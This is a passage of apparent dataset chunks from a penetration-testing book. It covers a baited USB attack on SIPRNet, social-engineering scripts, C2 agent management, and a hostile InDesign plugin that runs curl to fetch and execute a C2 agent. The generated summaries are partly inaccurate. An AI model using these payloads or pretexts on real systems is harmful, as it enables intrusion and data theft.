unattended….\n…Linking a computer with access to the SIPRNet to the Internet or to any\nother computer or media storage device that has not been approved for\nuse with SECRET information is a serious security violation. Once any\nmedia storage device such as a CD or thumb drive has been connected to\na computer with access to the SIPRNet, it becomes classified at the\nSECRET level. It must be protected accordingly and shall not be used on\nany unclassified computer.\nThe highlights are my own. This publicly accessible Internet web page just\ntold me everything I need to hack this network. One more quote from the\nsame web page (this time just for fun):\nFor computers used to process classified information, it is recommended\nthat infrared (IR) port beaming capability be disabled. If the IR port is\nunable to be disabled, cover the IR port with metallic tape.\nThere is a scene in a film called The Art of War (I'm no film reviewer but I'd\ngive it a miss), where Wesley Snipes steals data from a computer using an IR\nport while hanging upside down outside the target's office window. I realize\nthat it's just a film, so any portrayal of computer security is going to be\nsuggestive, but to me this is a step too far. Anyone who has ever tried to use\nthe IR port to do anything at all knows that this is optimistic at best. Usually\nyou will have two PCs with their IR ports inches away from each other\nscreaming, “Why won't you work?!” Nonetheless, at least it shows they're\nthinking (albeit in the completely wrong direction).\nA QUICK NOTE ON NETWORK SEGREGATION\nWhile networks such as NIPRNet and SIPRNet are airgapped entities,\napart from both themselves and the wider public Internet, this is only\nreally the case within any given facility. Remember that these networks\nhave users all over the world and are therefore not going to have\ndedicated cabling, so between sites the connections may use public\ninfrastructure, albeit be encrypted at a level that is in accordance with the\nhandling policy of data marked SECRET or NATO SECRET. Such\ntechnologies are not directly relevant here but make for interesting study.\nAnother point worth noting is that getting information on the general\nstructure of classified networks is not as hard as it may seem. Users need\nto be trained in their operation and Codes of Connection need to be\nwritten and followed. This documentation is not going to be SECRET\nsimply because the higher classified something is, the more of a pain it is\nto communicate. It is (within certain guidelines) the responsibility of the\nauthors to set the marking as they deem appropriate and the drive is often\nto keep things as low as possible to avoid headaches and expense. Policies\naside, it is also considerably more expensive to clear an individual to\nSECRET than it is to RESTRICTED. There is considerable documentation\non SIPRNet on the public Internet.\nI made a bold statement a couple of paragraphs ago that I'm now going to\nback up. What has this quoted text told us that is so critical to this mission?\nThere is no security policy in place to prevent USB drives being connected\nto SIPRNet computers. It probably happens all the time.\nOnce a USB device has been used on a SIPRNet-connected machine, it\nautomatically inherits SECRET level handling policy and “It must be\nprotected accordingly and shall not be used on any unclassified computer.”\nStill too vague? To review mission requirements, I need to:\nConstruct an appropriate payload.\nGet that payload in place.\nExfiltrate the target data.\nThat's as good an order as any in which to approach the problem.\nConstructing a Payload to Attack a Classified Network\nTo construct a payload, you first need to acquire a 3G/4G mobile USB dongle\nthat supports storage or permits storage using a MicroSD card. You need to\ndevelop a software attack that will be able to safely stay under the AV radar—\nin this instance, the HTA attack from the previous chapter to drive a\nVB/PowerShell when run. The timeline of the attack is as follows:\nUser plugs the USB drive into the target computer to determine contents\nand executes the HTA payload (or other attack depending on what is\nsuitable).\nThe HTA payload stealth installs the 3G/4G drivers for the dongle and\nestablishes C2.\nHaving detected that Internet access has been obtained, use whatever\nscripts are appropriate to execute the goals listed next.\nKeep in mind that C2 will be terminated the moment that the user removes\nthe dongle from the computer, so the trick is to make sure that the contents\nof the drive are interesting enough for there to be enough time for your\nscripts to run. The only issue in these points that has not already been\ndiscussed elsewhere in this book is the stealth deployment of the drivers. It is\nafter all rather unrealistic to expect the target to complete an interactive\ninstall for you. Luckily, this is rather trivial.\nStealthy 3G/4G Software Install\nIn a normal, legitimate scenario when a user wants to install a mobile dongle\nthey will manually install the software, generally being confronted with the\ninstall screen shown in Figure 7.2.\nFigure 7.2: Not even the greenest jarhead is going to fall for this.\nThere are two approaches. We can take apart the installer and make our own\nsilent installer, which is just a matter of noting what files are installed and\nwhat Registry entry made on a clean install and then mimicking that. Or, in\nthe case of the software noted (and plenty of other vendors, I'm not pointing\nfingers here), there is the option for a “silent” install. This is included to make\npushing out mass installs to corporate laptops less time consuming but also\nserves our purposes well. The following command will install and connect the\nmobile dongle automatically, silently, and without logging.\nsetup_vmb.exe s /L2057 /v\"OPCO_PROP=23415 /qn /norestart\"\nThe only option you will have to modify is the OPCO_PROP number, which is the\nID of the mobile carrier. These are going to vary by location but are easily\nfound on the web, as they are a matter of public record.\nAttacking the Target and Deploying the Payload\nIf you're wondering what might possess someone to take a USB drive from\nwherever they've obtained it and plug it into a secure, classified computer,\nyou're asking the right questions. First of all, recall what was discussed\nearlier: if a USB drive is plugged into a classified network then from that\nmoment on it is to be treated with the same level of protective policy as the\nnetwork itself. Ironically, this gives us our in. In this instance, identifying the\nUSB drive with the correct markings to imply that it originated from SIPRNet\nis the play. This can be achieved be adhering the following labels to each side\nof the device. SIPDIS means it's for SIPRNet distribution and NOFORN\nmeans No Foreign Nationals (see Figure 7.3).\nFigure 7.3: This creates the pretext.\nThe hardest part in this entire scenario is then getting the disk into a position\nwhere it is found (because it has been dropped, mislaid, or misaddressed).\nThen it will be passed through a chain of custody until it reaches the green\nroom staff, who is going to want to know what was on this device. Unless\nthere is a concerted and documented forensics exercise and associated staff at\nthe facility under attack (which requires all kinds of unpleasant finger\npointing paperwork as well as a specialized investigative capability), the\neasiest way to achieve this is to plug it into a SIPRNet workstation. Ironically,\nthis is the easiest way not to break security policy. This attack can be\ndevastatingly effective in any secure environment.\nThe trick is to get the device into the possession of the target without\narousing suspicion, but there's nothing new there. Most attacks of this kind\nare more convincing if you can get someone else to do them for you. We've\ncovered physical deployment of target packages elsewhere, but one idea is\nthat army boys tend to drink together in the same places. There is a perfect\nopportunity for one of them to “find” something they'll assume one of their\ncolleagues dropped, particularly after a couple of beers.\nEfficient “Burst-Rate” Data Exfiltration\nIt is unrealistic to think that such an attack (at least in and of itself) would\ncreate any long-term C2 solution. After all, the attack will continue only for as\nlong as the hardware is plugged into the SIPRNet computer. Therefore, the\ngoals of an attack of this kind have to be decided in advance and need to be\nhighly specific.\nCommon goals include:\nStealing classified data. Have the payload hunt the local system and file\nshares for certain file types. Office documents that fit a given criteria are\nusually a good start.\nAcquire elevated privileges (if not already available) and dump the local",
    "question": "What are the key considerations for conducting data exfiltration tests in a secure environment?",
    "summary": "This chapter discusses the importance of data exfiltration testing in secure environments and highlights the challenges of attacking high-security systems. It covers various methods for deploying payloads and exfiltrating data, including USB-based attacks, using Dropbox or email for data transfer, and setting up a wireless AP. The chapter also explains how classified networks like SIPRNet are designed to be secure but can still be vulnerable if proper precautions are not taken."
  },
  {
    "start": 53,
    "end": 53,
    "text": "passwords. These are unlikely to be particularly useful given the\nenvironment as well as the use of two-factor authentication, but they're\nalways fun to have. You never know when they might come in handy,\nparticularly local admin accounts.\nLocal caches, cookies, and passwords. C2 is not going to be active long\nenough for any kind of keylogging activity to be worth engaging in.\nLDAP data. Once you're inside a classified network, the technologies that\nyou will encounter are little different from most corporate networks. The\nmilitary is like any other large organization—a top-down bureaucracy led\nby aged men who don't know much about technology. The army uses\nSharePoint, Exchange, and WSUS like everyone else. We know from\nEdward Snowden how popular the former is. These make fine targets.\nFrom a purely penetration testing perspective, you do have to pay some\nkind of lip service to target security polices when you're hitting classified\nnetworks. Taking data marked SECRET over your C2 channel is not a good\nidea unless it and your C2 infrastructure are approved for handling such\ndata and let's be honest, they won't be. In that respect, taking a screenshot\nto prove you were there is a safer way to go.\nSummary\nThe purpose of this chapter was to teach you three things:\nEven the most secure networks can be infiltrated.\nData can be exfiltrated from even the most secure networks.\nSecurity policy can be turned against an organization with strict data-\nhandling procedures.\nThe examples given may seem contrived but they're not. All that is needed for\nan attacker to gain entry to the most secure environments is for one person to\nhave one lapse in judgment one time. I keep driving this point home because\nit really is the point. As a penetration tester, I have the easy job. An attacker is\nalways at an advantage. I would hate to have the responsibility of keeping a\nnetwork safe from attack; I'd never sleep.\nIn the next chapter, I talk more about social engineering and creative means\nof attacking a very different industry.\nExercises\n1. The code in the Microsoft Outlook email data exfiltration example is not\nas stealthy as it could be. What function could be added to make it\nstealthier? Hint, compile the code and see how it behaves.\n2. In this chapter, we touched on SPF, as it is the most commonly used\ntechnology for protection against mail spoofing. Another technology is\ncalled DMARC, which is built on top of SPF (as well as DKIM). Investigate\nthis technology and its implications for mail spoofing.\n3. The examples given for data exfiltration is this chapter are by no means\ncomplete. Consider other possibilities and how they might be\nimplemented. What other devices exist on a network that could be quickly\ndiscovered and subverted to get data out?",
    "question": "What are the key considerations for exfiltrating data from a classified network while adhering to security policies and using stealthy methods?",
    "summary": "This text discusses how even secure networks can be compromised, highlighting the importance of data exfiltration methods and the risks associated with classified environments. It also emphasizes that strict security policies can be turned against an organization, and that an attacker often has an advantage over a penetration tester. The author stresses that maintaining network security is a difficult responsibility, as it requires constant vigilance and awareness of potential vulnerabilities."
  },
  {
    "start": 54,
    "end": 58,
    "text": "Chapter 8\nHack Journalists\nIn this chapter I want to talk about social engineering—we've talked about it a\nlittle throughout the book but now that we're nearing the end I, want to add\nsome depth. Rather than replicate what I've written about in the past, I'd like\nto discuss a new framework to approach social engineering using what stage\nmediums and other performers call cold reading.\nAdditionally, I'll introduce some emerging and extant technologies that are\nuseful when looking for more creative ways to deliver a payload.\nFinally, I'll introduce some advanced concepts in C2 agent management that\nwill be vital to understand in an environment where you need to manage a\nnumber of agents without utilizing too much of the target's bandwidth.\nBriefing\nThe penultimate target in this book is a major international magazine\npublishing house. The major concerns coming from management were that\nthe editorial and development process were sloppy from a security perspective\nand that could lead to an attacker being able to modify publications prior to\ngoing to print (this attack could be motiveless mischief or something targeted\nby activists, and it would be equally expensive to rectify).\nThis publishing house, like many others, used Adobe Creative Suite tooling\nfor virtually every part of the development process—InDesign for layout,\nPhotoshop for imaging, etc. Again, like a lot of such businesses, they were\nvery much an Apple house and all their people used Macs. Handy information\nto have.\nRather than focus on generic attacks applicable to any business, I wanted to\nexplore a tailored approach that would attack their rich media tooling in some\nway, that is, to insert myself into the daily workflow of the company in such a\nway as to reduce any suspicion in the editing staff, who would likely be the\nprime targets. The attack section at the end of this chapter details how I\nsubverted a product they used every day to download and install a C2 agent.\nAdvanced Concepts in Social Engineering\nSocial engineering is often an exercise preceded by research into a target.\nHowever, sometimes that research may not be 100 percent effective or there\nmay be times when you have to think on your feet with little or no prep time.\nThere are ways to obtain information from a target in such circumstances, but\nin order to demonstrate what I'm talking about, I first want to put it in\ncontext.\nA couple of years ago, I attended a fundraising party with some friends. The\nhost had arranged for a Tarot reader to be present. I tend to think of myself as\nan open-minded skeptic (sure, anything's possible but I don't believe that bits\nof pasteboard being pushed around a table can tell the future), but it was a\nfundraiser and a bit of fun, so I went along with it. One by one, the guests\njoined the reader in an isolated room for 15 minutes and then would (almost\nwithout exception) emerge amazed with the accuracy of the predications or\nlife assessments that had been made. When it was my turn, it became obvious\nwhy she had wanted to do these “readings” separately: mine was highly\ngeneric and could have applied to pretty much anyone my age. In short, she\nwas relying on a technique that is known in the industry (psychics/stage\nmagicians, take your pick) as “cold reading.” Rather than mess with the lady, I\nplayed along, but the experience got me thinking.\nCold Reading\nCold readers use a number of methods to imply that they know much more\nabout the subject than they actually do. As I stated, it's most commonly (but\nnot exclusively) used in regard to “psychics” and stage performers. I thought\nthat it would be a fun art project to learn about the Tarot while\nsimultaneously studying everything I could find on cold reading as well\nwatching performances by the greats in the field of mentalism. I wanted to\nsee if there were ways that cold reading could be applied to the wider field of\nsocial engineering, specifically within penetration tests.\nI've written about more traditional social engineering in Unauthorized Access,\npublished by Wiley in 2009. These techniques are a little different; the\nfollowing are examples of cold reading methods as used by stage performers\nadapted for use in social engineering scenarios.\nThe Fuzzy Fact\nA fuzzy fact is a vague statement likely be accepted by the “mark” due to the\nway it is formulated. Following that acceptance, it allows the reader to develop\nthe dialogue into something more specific.\nA reader may say something like, “I can see a connection with Europe,\npossibly Britain, or it could be the warmer southern regions. This impression\nis quite strong; does this mean anything to you?”\nIf the mark answers something like, “Could this include Wales?” then the\nreader would expand on that by saying, “There is a definite Celtic feel to the\nvibrations I'm sensing.”\nUsing the Fuzzy Fact in Social Engineering\nGetting hold of certain people or finding out who you need to talk to in order\nto extract information is not always straightforward. We can use the fuzzy fact\ntechnique to do just that:\n“Hello, I hope you can help me. I've got a message here to return a call from\nsomeone in your company, but the handwriting of the guy who gave it to me\nis a nightmare. I'm not sure if it's Allan, Ali, or Anton… I can't make it out. All\nI know is it's to do with buying training courses in Fortify security software or\nsorting out training requirements. Do you have any idea who that might be?”\nThe cool thing about this approach is that it turns the process on itself.\nReception is used to having to block calls to certain people (from salesman or\nrecruiters usually), but that blocking process is now gone. Now it's just a\nconversation between two people, one who's trying to help out by returning a\ncall promptly and someone who's job it is to help. Note that the names in this\nexample could be first names or they could be surnames. If reception\nrecognizes a name that is similar to one you've quoted, then you will likely be\nimmediately connected. Otherwise:\n“I can put you through to Dave Peterson, he handles that, but I can't place an\nAnton or an Ali.”\nIn which case, all you have to say is, “Peterson, that's it. I've got the wrong file\nin front of me. Sorry! Could you put me through so I can find out why he's\ncalling?”\nThe Psychic Credit\nOne trick that psychics use to break down the natural skeptical resistance of\ntheir clients is to imply that they sense that the client has a naturally strong\npsychic vibration or talent. This can be done in a number of ways (“I see it in\nyour aura” or whatever), but the point is to lower skepticism by treating the\nclient as an equal and according them due respect. It's a nice trick and it\nworks very well.\nUsing the Psychic Credit in Social Engineering\nI'm not saying you should imply your targets have psychic powers, but a\nsimilar way of breaking down resistance when trying to extract information is\nto credit them with knowledge or experience they don't have. Again, by\ntreating the target as an equal and according them the respect of a peer, they\nare much more likely to give you the assistance you need. You can inject\nthings into the conversation like, “Ah, okay, I'm normally not used to dealing\nwith people who know what they're talking about—this is a nice change!”\nIn the UK (and probably elsewhere), there are few things people like less than\ndealing with GP's (general practitioners) assistants or receptionists. I don't\nwant to generalize, but it's practically a cliché. They try to dispense their\n“expertise” on prescriptions and other medical advice as though they are\ndoctors themselves. Point this out and be prepared to get nowhere if you're\ntrying to get an appointment with your doctor on the National Health Service.\nOn the other hand, if you massage this kind of personality—“You're the expert\nso I was wondering if you could tell me….”—and you'll have a much better\nexperience. This is not the same thing as flattery, which we cover in a bit.\nThe Rainbow Ruse\nThis is psychic's stock in trade. The Rainbow Ruse is a statement that credits\nthe client with both a personality trait and its opposite. For example:\n“You can be a very considerate person, very quick to help others even without\nbeing asked, but there are times, if you are honest, when you recognize a\nselfish streak in yourself.”\nThat's a win-win if ever there was one! The rainbow ruse allows you to make\nan irrefutable statement and that's social engineering gold.\nUsing the Rainbow Ruse in Social Engineering\nThis is useful if you need to appear to know more about a business or a\nprocess or an individual than you actually do. It makes for good small talk\nwhen integrated into other social engineering strategies. Consider the\nfollowing:\n“I was reading an article about your company just the other day. Financial\nTimes, if I recall correctly. The biggest takeaway for me was that it was\npointing out how segmented your industry can be. It was saying that with\nsome of your competitors, there's been quite a lot of change and fluctuation—\nyou know, restructuring, repositioning, talks of mergers—while in others\nthings have been really very calm, just ticking over much as expected.”\nNonsense. Complete and utter nonsense, but you get the point. You can say a\nlot and sound convincing enough without knowing anything.\nFlattery\nFlattery is similar to the psychic credit, but is broader in its approach and\nshould be approached with caution. Men are easy targets of flattery,\nparticularly by women. On the other hand, women are (by and large) not so\neasily manipulated by flattery, as they are more inured against it. It's\ninteresting to note, however, that by far, many more women see psychics and\nTarot readers than men. In any case, it's a highly effective technique in\npsychic readings.\n“You know how to be a good friend. I see that you're basically a good person,\nan honest person, who wants to do the right thing.”\n“You're warm and loving.”\n“You have a kind soul.”\n“You're an independent thinker.”\nThis is the sort of stuff that everyone likes to hear. Of course, “psychics” have\nan easier time of it because they can “divine” such things without having to\nprovide context and with the goal once again of breaking down skepticism and\ncultivating rapport.\nUsing Flattery in Social Engineering\nIf you're having some trouble facing off against corporate security policy\nwhile trying to acquire information, be nice and show how much you\nappreciate the fact that they take information security seriously:\n“I have to say I think your adherence to the essence of what security really is\nis spot on. Getting the balance right between functional process and security\nis never easy, but I think you've really judged it well—probably a bit better\nthan most companies in your sector. At least in my experience.”\nThis is also referred to in psychic readings as “praising the concern” or\npsychologically rewarding skepticism. Security personnel are only too aware\nof how difficult it is to balance functional process and security and will\ncertainly appreciate someone for noticing they're doing a good job. Just don't\ncome across as a kiss-ass.\nThe Jacques Statement\nThis is an interesting one. It is named after Jacques in Shakespeare's “As You\nLike It,” who gives the famous “Seven Ages of Man” speech. Most people are\nfundamentally the same. They have the same experiences at the same times\nin their lives, the same triumphs, achievements, crises, and disappointments.\nIt doesn't matter if the client is wearing a crisp suit and a Rolex or is sporting\na punk hairstyle and a studded wristband. This is why the first thing a psychic\nwill ask you is your age.\nThe following example is something that would be applicable to someone in\ntheir late 30s or early 40s:\n“Be honest with yourself: you have been spending a lot of time recently\nwondering what happened to all those dreams you had in your younger days—\nambitions and plans that once mattered to you. There is a part of you that\nwants to just scrap everything, get out of the rut, and start over again—this\ntime doing things your way.”\nThis is like telling a teenager that they are sometimes moody; it's like\nshooting fish in a barrel.\nUsing the Jacques Statement in Social Engineering\nIt's not just people's lives that are predictable but the lifespan of a business:\n“I've been following your business since the early days—the free-for-all when\nit was all about grabbing market share, getting a foothold, and then it was all\nabout consolidation. Everything's owned by HP and IBM these days isn't it?\nUsual story, the big fish merging into bigger fish to cut costs and squeeze\nmargins—trying to guarantee survival, really—and just a few independents\nbeing left to cater for specialist ‘niche’ sectors.”\nStatements like this can be customized as needed. They're useful for building\nrapport and demonstrating that the social engineer and the target are “on the\nsame page” and have trodden the same paths.\nThe Barnum Statement\nP.T. Barnum was a legendary showman and impresario who was said to have\n“something to please everybody.” As such, a Barnum Statement is one that is\ndesigned to ring true to everyone. These statements don't need to be flattering\nin nature. For example:\n“Occasionally your hopes and goals can be pretty unrealistic.”\n“You have a strong need for people to like and respect you.”\nOf course, they can be flattering:\n“You are an independent and original thinker; you don't just accept what\npeople tell you to believe.”\nThis is another classic psychic trick to appear knowledgeable about a subject\nwhile making a statement that could be applicable to just about anybody.\nUsing the Barnum Statement in Social Engineering\nLike the Jacques Statement, the Barnum Statement has applications far\nbeyond people. For example:\n“I was talking to an old friend of mine at InfoSec in London last week. He\nused to work for you guys, and he was saying that the business is there, if you\nknow where to find it, but the problem is making it pay. Thin margins keep\ngetting thinner, and you really have to go for the long-term to make it work.\nPerhaps that applies to some consultancy engagements more than others.”\nC2 Part VIII: Experimental Concepts in Command and\nControl\nSo far, we have examined a number of ways in which C2 can be maintained\nover the target infrastructure. However, in every scenario so far—regardless of\nimplementation—the model has has always relied on every node or agent\nunder our control having its own C2 channel. This is not always appropriate\nnor wise. In a situation where you will need to control or direct a number of\nhosts, this will generate excessive network traffic (or at the very least,\nexcessive beacons and therefore connections) out of the network. In such\ncircumstances, it is worth considering an alternative model that consolidates\nthe hosts in your C2 into a single management channel.\nAs you will see, this is not as easy as it sounds. There is, of course, no single\n“best” approach to advanced agent management, but in this chapter we will\nconsider two possible solutions. The one you take depends largely on the\ncircumstances of the mission and what is most appropriate given your\nknowledge of the architecture of the target network. However, in both cases\nthe goal is to select one of the C2 agents as a master and channel all the data\nthrough that node.\nScenario 1: C2 Server Guided Agent Management\nThe easiest way to achieve this goal is to allow the C2 server to assign roles to\nthe C2 agents. The initial agent to beacon in would be assigned the role of\nmaster, as shown in Figure 8.1.\nFigure 8.1: Initial beacon designated as Master node.\nAll subsequent beacons would receive instructions to channel traffic back\nthrough this master agent node. See Figure 8.2.\nFigure 8.2: C2 uses Master for outbound connectivity.\nHow nodes communicate between each other over the local network segment\nis a matter of personal preference, as virtually any protocol common on\ninternal networks can be modified or extended to include a C2 payload, ICMP,\nSNMP, and of course HTTPS.\nThese are three obvious examples in scenarios where an excessive use of\ninternal SSH traffic between workstations may be considered suspicious by\naggressive network monitoring. All will allow you to carry arbitrary data.\nHTTPS is not recommended for carrying C2 data outside the network, given\nthe additional potential scrutiny this protocol will receive from border level\nsecurity. However, the sky's the limit if you want to get creative and stay\nunder the radar. I'm currently experimenting with fake RIP and OSPF\nmessages (Intrusion Detection Systems won't meddle with internal routing\nprotocols).\nThe problem with this approach is that the entire C2 infrastructure becomes\ndependent on one agent node. Multiple agents can be assigned in a failover\nscenario, but that's usually needlessly complex. A simple solution in the event\nthat the C2 master agent dies (i.e., is discovered or the machine is switched\noff or rebooted) is to implement a timeout function based on a\ncommunication failure of an arbitrary period of time (see Figure 8.3).\nFigure 8.3: A timeout on the Master node signals it is likely no longer\nfunctional or the host is switched off.\nAt this point, the C2 server will assume that node is either temporarily or\npermanently disabled and will assign the role of C2 agent master to another\nhost. It will instruct the remaining slaves to route through this new host as\nbefore (see Figure 8.4).\nFigure 8.4: C2 Server nominates new Master node.\nScenario 2: Semi-Autonomous C2 Agent Management\nWhile the previous scenario is effective in most cases, there may be\ncircumstances where you will want to grant your C2 nodes more autonomy in\nselecting their own master node (or nodes), depending on certain factors\nspecific to the target environment. A simple broadcast packet or a fake ARP\npacket can be used to enable nodes that are not aware of each other's presence\nto communicate on a local network segment (see Figure 8.5).\nFigure 8.5: Agents nominate their own Master.\nOnce an agent master node has been assigned, C2 is initiated as per scenario 1\n(see Figure 8.6).\nFigure 8.6: The Master functions as a gateway for other nodes as before.\nHowever, the major difference is that the nodes need not wait for an agent\nmaster timeout to occur in order to conduct a new election where a new node\nis selected if necessary or the current one is maintained. This can occur at a\npredefined interval or between quiet times in C2 activity (see Figure 8.7).\nFigure 8.7: Further elections are held as necessary.\nNotes on the relationship between master and slave agents. The master agent\nhas a number of responsibilities, regardless of the scenario you choose to\nimplement:\nMonitoring the state of slave hosts. If a slave host fails or becomes\nunreachable, the master host notifies the C2 server.\nActing as the central conduit between the C2 server and the C2 slave\nnodes.\nCorrectly routing C2 messages to C2 slave nodes without the C2 server\nneeding to specify anything other than the slave node's identifying name\n(i.e., the workstation name).\nA master node should not be used for initiating a new election and this\nresponsibility continues to be shared by all hosts in the C2 infrastructure\n(simply because the master can die at any time).\nAn election algorithm need not be complex, nor should it be. Simply put,\nwhen it is decided (due to a communication failure or an exceeded period of\ntime), an election occurs where each member of the C2 infrastructure is a\nvoting member. Communication occurs through broadcast messages and is a\npoint-based system. The host with the most points becomes the new master\nagent node. Factors influencing points can be:\nRelative importance of the node. Is it a server, domain controller, or a high\nvalue asset previously indicated manually by the C2 server controller?\nPrevious reliability of the node as noted by uptime. Is it a box that gets\nswitched off at 5 pm every day?\nCommunication reliability in general, which can be rated in several ways\nwith a score that decreases every time a master is subject to a C2\ncommunications failure (or, conversely, increases based on the opposite).\nRandom jitter to avoid stagnation.\nThe business of determining master/slave relationships like this is a problem\nthat is faced by many developers in perfectly legitimate areas of software\ndevelopment where stealth is not a factor. It is therefore not surprising that it\ncan be somewhat more complex from our point of view. In computer science,\nthis problem is called leader election (not to be confused with leadership\nelection), and there are many unique paradigms and schools of thought\nwithin it that are beyond the scope of this book, but well worth exploring.\nCELEBRITY BANDIT POPPING\nAs a teenager, a major pastime of mine (along with a couple of notable\nconspirators) was prank-calling celebrities. In my defense, I grew up in\nsouthwest Wales and that's one of those places you kind of have to make\nyour own entertainment—for my American readers, think rural Louisiana.\nOne time we called George Takei just as he was leaving the house.\nUnderstandably he was annoyed and chided us by saying, “You can't do\nthis, it's bandit popping.” So that became the literal name of the game.\nReactions to being called at home by British kids with nothing better to do\nvaried. Charlton Heston was the perfect gentleman when we asked him to\nexplain the ten commandments, whereas Zsa Zsa Gabor used words I\ndaren't hint at. One time we spent ten minutes on the phone talking to a\ndelightful lady who denied being Leonard Nimoy's wife but we could hear\nhim in the background saying in his very distinctive voice, “Put down the\nphone. Put. Down. The. Phone.”\nWhy am I regaling you with stories of my delinquent youth?\nIf you wanted to engage in such anti-social behavior today, it would\nprobably be a lot easier to get celebrity phone numbers (ask Jennifer\nLawrence how she feels about mobile security). Back then, though, there\nwas no web, no iCloud, and certainly no smartphones. In Carmarthen in\n1993, the only people who had cell phones were drug dealers. So how did\nwe get phone numbers? It was a lot easier than you might think and\nemployed a lot of what I would later professionally call “social\nengineering.”\nIf you look at the credits at the end of any given film, you'll note that\neveryone who was associated with the project is listed: caterers, hair\nstylists, spiritual advisers, whoever. Agents. Agents were the guys who\nwere interesting at first because they would definitely have the numbers\nwe wanted and after a few false starts we got very good at getting them to\ngive numbers up. We'd misrepresent ourselves as lawyers, personal\nassistants, taxi firms, D-Girls. However, we soon learned that there is this\nwhole parasitic industry in Hollywood that feeds off celebrity (or caters to\nit exclusively, depending on your perspective) and these people will do\nanything to ingratiate themselves with the stars as well as boast of their\nclientele. That's an easy combination to exploit. An ex-colleague of mine\nset up shop in LA selling “bespoke” security solutions for celebrities. He'd\ntake a celeb's phone, wave a magic wand over it and declare it secure but\nat the same time he'd download the contacts so he could expand his client\nbase. Cynical but brilliant.\nIf you know the right leverage to put on the right people, getting\nprivileged information is trivial. I did learn one other important skill from\nall this and that's to speak in other accents. This would later evolve into\nmy signature party trick. If you haven't seen me do Hamlet as John\nWayne, you haven't fully experienced Shakespeare.\nDisclaimer: Do not prank call celebrities, it's not big, it's not clever, it's not\nfunny. Enough said.\nPayload Delivery Part VIII: Miscellaneous Rich Web\nContent\nWe've talked about Java applets and touched on Adobe Flash as attack\nvectors. However, as Oracle has expressed a desire to replace applets in their\ncurrent form and as the browser makers have lost all patience with Adobe\nover their complete lack of secure coding practices, neither of these\ntechnologies are going to be around forever. Their successors are already in\nactive deployment and are suitable for use in APT modeling attacks. Although\nthey are very different from each other technologically, the way they offer\ncontent to the user is (visually) not all that dissimilar, so it makes sense to\ntalk about the two together.\nJava Web Start\nJWS applications don't run inside the browser but are generally deployed\nthrough the browser interface. From a software development perspective, this\nhas several advantages, but mainly it allows much more refined memory\nmanagement and indeed the allocation of much more memory than would\nnormally be provided to an applet. Java Web Start is now deployed by default\nwith the Java Runtime Environment and doesn't need to be installed\nseparately by the user.\nRather than load a .jar file from within an HTML page, JWS uses an XML\nfile with a .jnlp (Java Network Launching Protocol) extension. When a user\nclicks on the file, the .jar is loaded from the network and passed straight to\nthe JRE for execution, which again takes place in its own frame rather than\nwithin the context of the browser window. A .jnlp file to launch a .jar from\nthe web looks like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jnlp spec=\"1.0+\" codebase=\"http://c2.org/c2\" href=\"\">\n<information>\n<title>JWS APT fun!</title>\n<vendor>APT demo.</vendor>\n<offline-allowed/>\n</information>\n<resources>\n<j2se version=\"1.5+\"\nhref=\"http://java.sun.com/products/autodl/j2se\"/>\n<jar href=\"c2.jar\" main=\"true\"/>\n</resources>\n<applet-desc name=\"c2 applet\" main-class=\"c2applet.Main\"\nwidth=\"300\" height=\"200\">\n</applet-desc>\n<update check=\"background\"/>\n</jnlp>\nOne of the reasons Oracle cited for moving to this model was “security”;\nhowever, as long as the referenced .jar file containing the C2 payload is code\nsigned (see Chapter 2, as the process is identical), there is no restriction to the\nfile system, process execution, or anything else.\nAdobe AIR\nMuch like JWS, Adobe AIR uses existing technologies to execute content that\nwould traditionally be executed within the browser in a standalone frame. AIR\napplications are cross-platform and mobile friendly. From our perspective,\nunlike Flash running in a web browser, AIR apps run with the same security\nrestrictions as native applications and as such have access to an unsandboxed\nfile system. They can start applications, access the network, and so forth.\n(This functionality is dramatically curtailed on mobile platforms—particularly\non iOS where, as with any unjailbroken iPhone/iPad, only the local file\nsystem is accessible.)\nAIR applications are created in the same way as Flash applets using the same\nAdobe technologies.\nA Word on HTML5\nHTML5 and its associated technologies are still evolving and in emergence\nand at present are not terribly interesting (from the perspective of APT\nmodeling). One thing that is interesting and worthy of further study is that\nHTML5 permits writing content to disk, albeit to a completely sandboxed\nvirtual file system. I mention this here solely because such things have a way\nof going pear shaped from a security perspective and it might be an\ninteresting way in the future to bypass security zones. For now, it's more of a\n“watch this space” type of affair.\nThe Attack\nIn the briefing I stated that I wanted to attack the processes used by the\nediting staff in some way. The philosophy behind that being that it behooves\nyou to learn the way your target works to create the most successful and\nprecise attacks possible, rather than relying on generic exploits or attacks.\nThis attack is directed at Adobe InDesign, a complex publishing layout and\nediting package. Rather than look for unpublished buffer overflows or other\nmemory corruption bugs, the goal is to create a hostile InDesign plugin and\ntrick a user into installing it. Creating plugins for InDesign can be complex\nprocess, but this code need not be overly complicated as the goal is simply to\ndeliver our C2 agent. Additionally, Adobe provides a complete Software\nDevelopment Kit (SDK).\nThe targets are running OS X, so in order to create a plugin we need the\nfollowing:\nAdobe InDesign CS5\nApple InDesign SDK (download link)\nA Mac running OS X, El Capitan\nThe latest version of Apple's Xcode development environment\nNo prior knowledge of the environment is assumed. A quick note to the\nreader—I don't care much for Xcode as a RAD environment. I've never found\nit to be the best or easiest way to create code even for its very specific\nintended purposes (i.e., Mac and iPhone development) and in the next chapter\nwhen we discuss creating hostile iPhone and Android code, I'll take a radical\ndeparture from it to introduce other tools. However, right now there's no\ngetting away from it.\nThis template is essentially an empty InDesign plugin. It contains everything\nneeded to build a plugin that, as it stands, will do nothing. We don't care\nabout any of the SDK functionality beyond having a project that will\nsuccessfully build. The rest of the code will be entirely generic C++ within the\nXcode editor. The goal therefore is to add the necessary code to download and\nimplement our C2 agent and ensure that this code is executed when the\nplugin is launched.\nThe command in C++ to execute an external shell command is system.\nIn the interests of extreme simplicity, two system calls are made—one to\nretrieve the C2 agent and one to execute it:\nsystem(\"curl -O http://c2server/c2agent\")\nsystem(\"./c2agent\")\nThis example is for clarity. I expect you to be able to do something better. I'm\nusing curl rather than wget, as the former is installed by default in OS X,\nwhereas the latter is not. This code is included in the\nSDKPluginEntrypoint.cpp file, as shown in Figure 8.8.\nFigure 8.8: The SDKPluginEntrypoint.cpp file.\n#include \"VCPlugInHeaders.h\"\n#include \"PlugIn.h\"\nstatic PlugIn gPlugIn;\n/** GetPlugIn\nThis is the main entry point from the application to the plug-\nin.\nThe application calls this function when the plug-in is\ninstalled\nor loaded. This function is called by name, so it must be\ncalled\nGetPlugIn, and defined as C linkage.\n@author Jeff Gehman\n*/\nIPlugIn* 